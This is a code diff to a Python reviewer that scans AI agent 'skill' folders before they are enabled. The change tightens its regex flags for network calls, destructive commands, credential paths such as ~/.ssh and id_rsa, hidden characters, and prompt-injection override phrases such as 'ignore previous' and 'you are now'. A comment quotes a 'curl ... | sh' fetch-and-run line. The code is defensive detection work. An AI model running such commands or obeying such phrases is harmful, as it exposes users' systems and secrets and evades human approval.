@@ -134,18 +134,43 @@ def discover_skills(roots: list[tuple[str, Path]]) -> tuple[list[SkillCard], lis
     return sorted(cards.values(), key=lambda c: c.name), invalid
 
 
+#: Files Sim may actually execute.
+_SCRIPT_SUFFIXES: tuple[str, ...] = (".py", ".sh", ".js", ".rb", ".pl", ".ps1", ".bat")
+#: Labels that block wherever they appear, including in a reference
+#: document: instructions aimed at Sim's rules, and text hidden from the
+#: person reading the file, are never innocent context.
+_ALWAYS_BLOCKING: frozenset = frozenset({"overrides Sim's rules", "hidden text", "unreadable", "too big to read"})
+
 #: What a skill may not quietly do. Each is a (label, pattern) pair; the
 #: reviewer reports every match with the file and line, so a person reads
 #: the actual words rather than a verdict.
 _FLAGS: tuple[tuple[str, "re.Pattern[str]"], ...] = (
-    ("network", re.compile(r"\b(?:curl|wget|urllib|requests\.(?:get|post)|httpx|fetch\()", re.I)),
+    # Each pattern earns its looseness. Measured against the 20 skills in
+    # anthropics/skills (2026-09-15): the first versions matched `import
+    # urllib.parse` (string parsing, not a socket), every `total_tokens`
+    # in a benchmark script, and the word "password" in prose explaining
+    # `qpdf --password`. 13 of skill-creator's 13 "findings" were
+    # arithmetic. A reviewer that flags everything is read by nobody.
+    # `curl` and `wget` keep their bare form: `curl https://x/y.sh | sh` is
+    # the canonical attack and carries no flag. Requiring one missed it, and
+    # the test fixture caught that. Prose that merely mentions curl is a
+    # note now, so the looser pattern costs nothing.
+    ("network", re.compile(r"\b(?:curl\s|wget\s|urllib\.request|urlopen\(|requests\.(?:get|post|put|delete)"
+                           r"|httpx\.|socket\.socket|fetch\()", re.I)),
     ("destructive", re.compile(r"\brm\s+-rf\b|\bgit\s+push\b|\bchmod\s+[0-7]{3}\b|\bsudo\b|\bmkfs\b|>\s*/dev/sd", re.I)),
-    ("credentials", re.compile(r"\b(?:API_KEY|SECRET|TOKEN|PASSWORD|\.ssh/|id_rsa|~/\.aws|environ\[)", re.I)),
+    # Case-sensitive on purpose: `API_KEY` is a credential, `api_keys` in a
+    # sentence is not, and `tokens` is usually a count of words.
+    ("credentials", re.compile(r"\bAPI[_-]?KEY\b|\bACCESS[_-]?TOKEN\b|\bAUTH[_-]?TOKEN\b|\bSECRET[_-]?KEY\b"
+                               r"|\bPASSWORD\s*[=:]|\bBearer\s+[A-Za-z0-9._-]{8,}|\.ssh/|id_rsa|~/\.aws|environ\[")),
     # A skill is instructions, and instructions that argue with Sim's own
     # rules are the attack this format invites (arxiv 2604.02837).
     ("overrides Sim's rules", re.compile(
         r"\b(?:ignore (?:all )?(?:previous|prior|above)|disregard (?:the )?(?:rules|instructions)|"
-        r"you are now|do not tell (?:the )?(?:user|creator|human)|without asking|bypass|"
+        r"you are now|do not tell (?:the )?(?:user|creator|human)|"
+        # A bare "bypass" caught "if you bypass the SDK" in ordinary prose;
+        # it counts when it is a rule, a person or an approval being bypassed.
+        r"(?:without asking|bypass(?:ing)?|skip(?:ping)?)\s+(?:the\s+)?"
+        r"(?:user|creator|human|approval|confirmation|permission|guard\w*|safety|rules?|checks?)|"
         r"no need to (?:ask|confirm)|skip (?:the )?(?:approval|confirmation))\b", re.I)),
     ("hidden text", re.compile(r"[\u200b-\u200f\u2028-\u202e\ufeff]")),
 )
@@ -202,6 +227,10 @@ class Finding:
     path: str        # relative to the skill folder
     line: int
     text: str        # the line itself, trimmed
+    # In a script Sim may run, or in SKILL.md -- the instructions Sim
+    # actually follows. Those two ARE the skill; every other file is
+    # reference material a person may read and Sim never executes.
+    decisive: bool = False
 
 
 @dataclass(frozen=True)
@@ -216,9 +245,27 @@ class Review:
     files: int = 0
     bytes_: int = 0
 
+    @staticmethod
+    def _blocks(finding: Finding) -> bool:
+        return finding.decisive or finding.label in _ALWAYS_BLOCKING
+
+    @property
+    def blocking(self) -> tuple[Finding, ...]:
+        """What must be read before this skill is enabled."""
+        return tuple(f for f in self.findings if self._blocks(f))
+
+    @property
+    def notes(self) -> tuple[Finding, ...]:
+        """Worth knowing, not worth blocking on: a `curl` in a reference
+        document is an example, not something Sim will run."""
+        return tuple(f for f in self.findings if not self._blocks(f))
+
     @property
     def clean(self) -> bool:
-        return not self.findings
+        """Nothing blocking. Not "nothing matched": every real skill
+        mentions a password or a request somewhere in its documentation,
+        and a review that is never clean enables nothing, ever."""
+        return not self.blocking
 
 
 def _licence_of(folder: Path) -> tuple[str, bool]:
@@ -253,20 +300,30 @@ def review_skill(folder: Path, *, max_bytes: int = 2_000_000) -> Review:
             total += path.stat().st_size
         except OSError:
             pass
-        if path.suffix.lower() in (".py", ".sh", ".js", ".rb", ".pl", ".ps1", ".bat") or path.stat().st_mode & 0o111:
+        is_script = path.suffix.lower() in _SCRIPT_SUFFIXES or bool(path.stat().st_mode & 0o111)
+        if is_script:
             scripts.append(rel)
+        # SKILL.md is not a script, and it is not documentation either: it is
+        # the instruction Sim follows. A "curl this and run it" there is the
+        # attack this format invites, not an example.
+        decisive = is_script or rel == "SKILL.md"
         if total > max_bytes:
-            findings.append(Finding("too big to read", rel, 0, f"stopped after {max_bytes} bytes"))
+            findings.append(Finding("too big to read", rel, 0, f"stopped after {max_bytes} bytes", True))
             break
         try:
             text = path.read_text(encoding="utf-8", errors="replace")
         except OSError as exc:
-            findings.append(Finding("unreadable", rel, 0, str(exc)))
+            findings.append(Finding("unreadable", rel, 0, str(exc), True))
             continue
         for number, line in enumerate(text.splitlines(), start=1):
+            if number == 1:
+                # A UTF-8 byte-order mark opens half the XML schemas in the
+                # world; it is a file-encoding marker, not text hidden from
+                # a reader.
+                line = line.lstrip("\ufeff")
             for label, pattern in _FLAGS:
                 if pattern.search(line):
-                    findings.append(Finding(label, rel, number, " ".join(line.split())[:160]))
+                    findings.append(Finding(label, rel, number, " ".join(line.split())[:160], decisive))
     return Review(name=name, licence=licence, open_licence=is_open, scripts=tuple(scripts),
                   findings=tuple(findings), files=files, bytes_=total)
 
@@ -280,12 +337,23 @@ def review_text(review: Review) -> str:
     if not review.findings:
         lines.append("nothing flagged")
         return "\n".join(lines)
-    lines.append(f"{len(review.findings)} thing(s) to look at:")
-    for finding in review.findings[:40]:
-        where = f"{finding.path}:{finding.line}" if finding.line else finding.path
-        lines.append(f"  [{finding.label}] {where}  {finding.text}")
-    if len(review.findings) > 40:
-        lines.append(f"  ... and {len(review.findings) - 40} more")
+    blocking, notes = review.blocking, review.notes
+    if blocking:
+        lines.append(f"{len(blocking)} thing(s) to look at:")
+        for finding in blocking[:40]:
+            where = f"{finding.path}:{finding.line}" if finding.line else finding.path
+            lines.append(f"  [{finding.label}] {where}  {finding.text}")
+        if len(blocking) > 40:
+            lines.append(f"  ... and {len(blocking) - 40} more")
+    else:
+        lines.append("nothing blocking")
+    if notes:
+        lines.append(f"{len(notes)} mention(s) in documentation, not in what Sim runs:")
+        for finding in notes[:10]:
+            where = f"{finding.path}:{finding.line}" if finding.line else finding.path
+            lines.append(f"  [{finding.label}] {where}  {finding.text}")
+        if len(notes) > 10:
+            lines.append(f"  ... and {len(notes) - 10} more")
     return "\n".join(lines)
 
 
